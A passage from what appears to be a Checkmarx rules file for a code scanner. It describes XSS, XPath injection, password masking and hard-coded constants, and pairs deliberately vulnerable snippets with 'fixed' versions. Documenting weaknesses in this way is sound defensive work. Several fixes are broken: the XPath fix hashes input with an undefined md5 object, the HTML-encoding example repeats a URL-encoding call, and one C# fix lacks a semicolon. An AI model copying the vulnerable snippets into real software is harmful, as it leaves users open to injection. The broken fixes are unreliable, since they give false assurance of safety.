description.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Name, Observed Examples,
Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Related Attack Patterns&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-10-29&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Taking Actions based on File
Name or Extension of a User Supplied File&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_577</key><name>GWT_DOM_XSS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use social engineering to cause a user to send the website engineered input, such as a URL with an engineered anchor, causing the browser to rewrite web pages. The attacker can then pretend to be the original website, which would enable the attacker to steal the user's password, request the user&amp;#8217;s credit card information, provide false information, or run malware. From the victim&amp;#8217;s point of view, this is the original website, and the victim would blame the site for incurred damage.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application web page includes data from user input (including the page URL). The user input is embedded in the page, causing the browser to display it as part of the web page. If the input includes HTML fragments or JavaScript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary user input without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Fully encode all dynamic data before embedding it in the webpage. Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content.&lt;/li&gt;
&lt;li&gt;HTML Attribute encoding for data output to attribute values.&lt;/li&gt;
&lt;li&gt;JavaScript encoding for JavaScript.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using the ESAPI4JS encoding library.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
For dynamically creating URLs in JavaScript, use the OWASP ESAPI4JS library:

      &lt;/h4&gt;&lt;pre&gt;window.location = ESAPI4JS.encodeForURL(input);&lt;/pre&gt;&lt;h4&gt;

For creating dynamic HTML in JavaScript, use the OWASP ESAPI4JS library:

      &lt;/h4&gt;&lt;pre&gt;window.location = ESAPI4JS.encodeForURL(input);&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;
For dynamically creating URLs in JavaScript, use the OWASP ESAPI4JS library:

      &lt;/h4&gt;&lt;pre&gt;window.location = ESAPI4JS.encodeForURL(input);&lt;/pre&gt;&lt;h4&gt;

For creating dynamic HTML in JavaScript, use the OWASP ESAPI4JS library:

      &lt;/h4&gt;&lt;pre&gt;window.location = ESAPI4JS.encodeForURL(input);&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1220</key><name>Potential_Stored_XSS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use legitimate access to the application to submit engineered data to the application&amp;#8217;s database. When another user subsequently accesses this data, web pages may be rewritten and malicious scripts may be activated.&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application creates web pages that include data from the application&amp;#8217;s database. The data is embedded directly in the page's HTML, causing the browser to display it as part of the web page. This data may have originated in input from another user. If the data includes HTML fragments or Javascript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary database data without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all dynamic data, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Validation is not a replacement for encoding. Fully encode all dynamic data, regardless of source, before embedding it in output. Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content&lt;/li&gt;
&lt;li&gt;HTML attribute encoding for data output to attribute values&lt;/li&gt;
&lt;li&gt;Javascript encoding for server-generated Javascript.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using either the ESAPI encoding library, or its built-in functions. For earlier versions of ASP.NET, consider using the AntiXSS library.&lt;/li&gt;
&lt;li&gt;In the Content-Type HTTP response header, explicitly define character encoding (charset) for the entire page.&lt;/li&gt;
&lt;li&gt;Set the httpOnly flag on the session cookie, to prevent XSS exploits from stealing the cookie.&lt;/li&gt;
&lt;/ol&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Data obtained from the execution of an SQL command is output to a label&lt;/h4&gt;&lt;pre&gt;public class StoredXss
{
        public string foo(Label lblOutput, SqlConnection connection, int id)
        {
                string sql = "select email from CustomerLogin where customerNumber = @id";
                SqlCommand cmd = new SqlCommand(sql, connection);
                cmd.Prepare();
                cmd.Parameters.AddWithValue("@id", id);
                string output = (string)cmd.ExecuteScalar();
                lblOutput.Text = String.IsNullOrEmpty(output) ? "Customer Number does not exist" : output;
        }
}&lt;/pre&gt;&lt;h4&gt;
The outputed string is Html encoded before it is displayed in the label
      &lt;/h4&gt;&lt;pre&gt;public class StoredXssFixed
{
        public string foo(Label lblOutput, SqlConnection connection, HttpServerUtility Server, int id)
        {
                string sql = "select email from CustomerLogin where customerNumber = @id";
                SqlCommand cmd = new SqlCommand(sql, connection);
                cmd.Prepare();
                cmd.Parameters.AddWithValue("@id", id);
                string output = (string)cmd.ExecuteScalar()
                lblOutput.Text = String.IsNullOrEmpty(output) ? "Customer Number does not exist" : Server.HtmlEncode(output);                
        }
}&lt;/pre&gt;&lt;h3&gt;JavaScript&lt;/h3&gt;&lt;h4&gt;Data obtained from the execution of an SQL command is rendered to a web-page template&lt;/h4&gt;&lt;pre&gt;function renderUserProfileTable(res, connection, user_id) {
	connection.query('SELECT id,name,description from user WHERE id= ?', [user_id],function(err, results) {
		var table = "&lt;table&gt;"
		table += "&lt;table class='profile-html-table'&gt;"
		table += "&lt;tr&gt;&lt;td&gt;" + results[0].name + "&lt;/td&gt;&lt;/tr&gt;"
		table += "&lt;tr&gt;&lt;td&gt;" + results[0].description + "&lt;/td&gt;&lt;/tr&gt;"
		table += "&lt;/table&gt;"
		res.render("profile", table)
	});
}&lt;/pre&gt;&lt;h4&gt;Data obtained from the execution of an SQL command is encoded and then rendered to a web-page template&lt;/h4&gt;&lt;pre&gt;var htmlencoder = require('htmlencode');

function renderUserProfileTable(res, connection, user_id) {
	connection.query('SELECT id,name,description from user WHERE id= ?', [user_id],function(err, results) {
		var table = "&lt;table&gt;"
		table += "&lt;table class='profile-html-table'&gt;"
		table += "&lt;tr&gt;&lt;td&gt;" + htmlencoder.htmlEncode(results[0].name) + "&lt;/td&gt;&lt;/tr&gt;"
		table += "&lt;tr&gt;&lt;td&gt;" + htmlencoder.htmlEncode(results[0].description) + "&lt;/td&gt;&lt;/tr&gt;"
		table += "&lt;/table&gt;"
		res.render("profile", table)
	});
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Data obtained from the excecution of an SQL command is output to a label&lt;/h4&gt;&lt;pre&gt;public class Stored_XSS {
	public static void XSSExample(Statement stmt) throws SQLException {
		Label label = new Label();
		ResultSet rs;
		rs = stmt.executeQuery("SELECT * FROM Customers WHERE UserName = Mickey");
		String lastNames = "";
		while (rs.next()) {
			lastNames += rs.getString("Lname") + ", ";
		}
		label.setText("Mickey last names are: " + lastNames + " ");
	}
}&lt;/pre&gt;&lt;h4&gt;The outputed string is encoded to hard-coded string before it is displayed in the label&lt;/h4&gt;&lt;pre&gt;public class Stored_XSS_Fix {
	public static void XSSExample(Statement stmt) throws SQLException {
		Label label = new Label();
		ResultSet rs;
		HashMap&lt;String, String&gt; sanitize = new HashMap&lt;String, String&gt;();
		sanitize.put("A", "Cohen");
		sanitize.put("B", "Smith");
		sanitize.put("C", "Bond");
		rs = stmt.executeQuery("SELECT * FROM Customers WHERE UserName = Mickey");
		String lastNames = "";
		while (rs.next()) {
			lastNames += sanitize.get(rs.getString("Lname")) + ", ";
		}
		label.setText("Mickey last names are: " + lastNames + " ");
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1652</key><name>Missing_Password_Field_Masking</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Missing Password Field Masking&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;549&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_549_Description" id="oc_549_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The software fails to mask passwords during entry, increasing
the potential for attackers to observe and capture
passwords.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_549_Time of Introduction" id="oc_549_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_549_Potential Mitigations" id="oc_549_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Recommendations include requiring all password fields in your web
application be masked to prevent other users from seeing this
information.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_549_Other Notes" id="oc_549_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;Basic web application security measures include masking all passwords
entered by a user when logging in to a web application. Normally, each
character in a password entered by a user is instead represented with an
asterisk.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_549_Relationships" id="oc_549_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;255&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=255" target="_blank"&gt;Credentials Management&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;355&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=355" target="_blank"&gt;User Interface Security Issues&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts&lt;/span&gt;699&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;522&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=522" target="_blank"&gt;Insufficiently Protected Credentials&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_549_Content History" id="oc_549_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Anonymous Tool Vendor (under NDA)&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_597</key><name>XPath_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Depending on the type of information contained in the queried XML document, an attacker could cause any effect of selecting the wrong information from the XML document, such as stealing unauthorized data or impersonating another user.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application queries an XML document by using a textual XPath query. The application creates the query by simply concatenating strings including the user's input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could be maliciously crafted to cause the application to select the wrong information from the XML document.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Ideally, avoid making the xpath query dependent on user input. If it is necessary to make the query dependent on user input, preferably map XPath queries to user parameters, maintaining separation between data and code. If it is necessary to include the user input in the query, the input must be first properly validated as above.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application uses a user inputed string to construct an XPath query
      &lt;/h4&gt;&lt;pre&gt;class XPathInjection
    {
        static void foo(XPathDocument document)
        {
            XPathNavigator navigator = document.CreateNavigator();
            string input = Console.ReadLine();
            XPathNodeIterator nodes = navigator.Select(input);
        }
    }&lt;/pre&gt;&lt;h4&gt;
The user inputed string is encoded before usage in the XPath query
      &lt;/h4&gt;&lt;pre&gt;class XPathInjectionFixed
    {
        static void foo(XPathDocument document)
        {
            XPathNavigator navigator = document.CreateNavigator();
            string input = Console.ReadLine();
                        byte[] fileName = md5.ComputeHash(System.Text.Encoding.ASCII.GetBytes(input));
                        input = System.Text.Encoding.Default.GetString(fileName);
            XPathNodeIterator nodes = navigator.Select(input);
        }
    }&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application uses a user inputed string to construct an XPath query&lt;/h4&gt;&lt;pre&gt;public class XPath_Injection {
	public static void main(String[] args) {
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter xpath expression: ");
		String expression = userInputScanner.nextLine();

		// read a string value
		XPath xPath = XPathFactory.newInstance().newXPath();
		try {
			XPathExpression email = xPath.compile(expression);
		} catch (XPathExpressionException e) {
			e.printStackTrace();
		}
	}
}&lt;/pre&gt;&lt;h4&gt;The user inputed string is encoded before usage in the XPath query&lt;/h4&gt;&lt;pre&gt;public class XPath_Injection_Fixed {
	public static void main(String[] args) {
		HashMap&lt;String, String&gt; sanitize = new HashMap&lt;String, String&gt;();
		sanitize.put("student", "/class/student");
		sanitize.put("graduate", "/class/graduate");
		sanitize.put("professor", "/class/professor");
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter xpath expression: ");
		String expression = userInputScanner.nextLine();

		// read a string value
		XPath xPath = XPathFactory.newInstance().newXPath();
		try {
			XPathExpression email = xPath.compile(sanitize.get(expression));
		} catch (XPathExpressionException e) {
			e.printStackTrace();
		}
	}
}&lt;/pre&gt;&lt;h3&gt;Python&lt;/h3&gt;&lt;h4&gt;The application uses a user inputed string to construct an XPath query&lt;/h4&gt;&lt;pre&gt;from sys import stdin
import xpath
print 'Insert item number: '
userInput = stdin.readline()	
xpath.find('//item' + userInput, doc)&lt;/pre&gt;&lt;h4&gt;The user inputed string is turned into an integer before usage in the XPath query&lt;/h4&gt;&lt;pre&gt;from sys import stdin
import xpath
print 'Insert item number: '
userInput = stdin.readline()	
xpath.find('//item' + str(int(userInput)), doc)&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1668</key><name>Use_of_Hard_coded_Security_Constants</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Use of Hard-coded, Security-relevant Constants&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;547&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_547_Description" id="oc_547_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
